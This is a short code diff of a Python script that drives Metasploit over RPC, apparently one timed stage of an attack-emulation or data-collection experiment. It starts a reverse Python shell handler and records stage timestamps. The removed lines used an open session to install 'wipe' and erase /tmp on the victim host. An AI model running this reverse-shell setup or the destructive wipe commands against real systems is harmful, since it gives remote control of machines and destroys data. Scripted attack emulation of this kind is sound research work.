@@ -20,30 +20,24 @@ def main(argv):
     wipe_disk_folder = "/tmp"
 
     client = MsfRpcClient('kali')
+    
+    # start step 6
+    output_time_file = 'time_stage_6_start.txt'
+    record_timestamp(folder, output_time_file)
+    time.sleep(2)
 
     exploit = client.modules.use('exploit', 'multi/handler')
     payload = client.modules.use('payload', 'cmd/unix/reverse_python')
     payload['LHOST'] = my_ip
-
-    time.sleep(2)
-    output_time_file = 'time_stage_6_start.txt'
-    record_timestamp(folder, output_time_file)
-    time.sleep(2)
 
     exploit.execute(payload=payload)
 
     while client.jobs.list:
         time.sleep(1)
 
-    shell = client.sessions.session('4')
-    shell.write('apt install wipe -y')
-    time.sleep(30)
-    shell.write("wipe -f {0}".format(wipe_disk_folder))
-
     time.sleep(10)
     output_time_file = 'time_stage_6_end.txt'
     record_timestamp(folder, output_time_file)
     time.sleep(2)
-
 
 main(sys.argv)
